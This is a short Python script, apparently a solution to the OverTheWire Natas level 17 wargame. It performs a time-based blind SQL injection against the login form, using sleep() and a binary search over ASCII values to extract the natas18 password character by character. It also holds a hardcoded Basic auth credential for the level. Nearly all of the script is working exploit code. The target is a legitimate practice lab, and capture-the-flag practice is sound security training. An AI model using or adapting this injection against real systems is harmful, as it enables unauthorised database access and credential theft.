import requests

res = ""
url = "http://natas17.natas.labs.overthewire.org/index.php"

for cur in range(1,33):
    mini = 0
    maxi = 127
    while mini < maxi:
        mid = (mini + maxi) // 2
        payload = {"username": 'natas18" AND ASCII(SUBSTRING(password, ' + str(cur) + ', 1)) <= ' + str(mid) + ' AND (select sleep(1)) = "0'}
        headers = {"Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="}
        try:
            r = requests.post(url, data=payload, headers=headers,timeout=1)
            mini = mid + 1
        except requests.exceptions.Timeout:
            maxi = mid
    res += chr(mini)
    print(mini)
print(res)
